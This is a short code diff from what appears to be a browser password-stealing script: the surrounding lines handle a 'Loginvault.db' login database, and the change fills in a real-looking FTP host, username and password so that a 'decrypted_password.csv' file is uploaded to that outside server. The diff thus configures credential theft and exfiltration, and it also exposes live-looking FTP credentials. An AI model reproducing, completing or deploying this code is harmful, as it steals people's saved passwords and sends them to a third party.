@@ -89,9 +89,9 @@ if __name__ == '__main__':
                     conn.close()
                     os.remove("Loginvault.db")
         # Upload to FTP
-        ftp_server = ''  # Replace with your FTP server
-        ftp_username = ''  # Replace with your FTP username
-        ftp_password = ''  # Replace with your FTP password
+        ftp_server = 'us-east-1.sftpcloud.io'  # Replace with your FTP server
+        ftp_username = '86cb675c25c04e65a4e653a6f618152d'  # Replace with your FTP username
+        ftp_password = 'uaaAKNB3CNvaSWfcnu2CVAwRCFTACJPR'  # Replace with your FTP password
         upload_to_ftp('decrypted_password.csv', ftp_server, ftp_username, ftp_password)
     except Exception as e:
         print("[ERR] %s" % str(e))
